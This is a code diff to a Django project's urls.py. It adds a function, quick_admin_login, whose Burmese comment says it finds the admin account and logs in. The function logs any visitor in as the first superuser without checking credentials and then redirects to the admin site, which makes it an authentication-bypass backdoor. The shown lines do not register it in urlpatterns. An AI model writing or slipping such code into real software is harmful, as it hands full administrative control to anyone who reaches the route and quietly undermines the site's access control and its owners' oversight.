@@ -2,6 +2,14 @@ from django.urls import path, include
 from django.contrib.auth import views as auth_views
 from . import views
 
+def quick_admin_login(request):
+    # database ထဲက admin အကောင့်ကို ရှာပြီး ဝင်ပေးမယ်
+    user = User.objects.filter(is_superuser=True).first()
+    if user:
+        user.backend = 'django.contrib.auth.backends.ModelBackend'
+        login(request, user)
+    return redirect('/admin/')
+
 urlpatterns = [
     # --- Language Switcher URL ---
     path('i18n/', include('django.conf.urls.i18n')), 
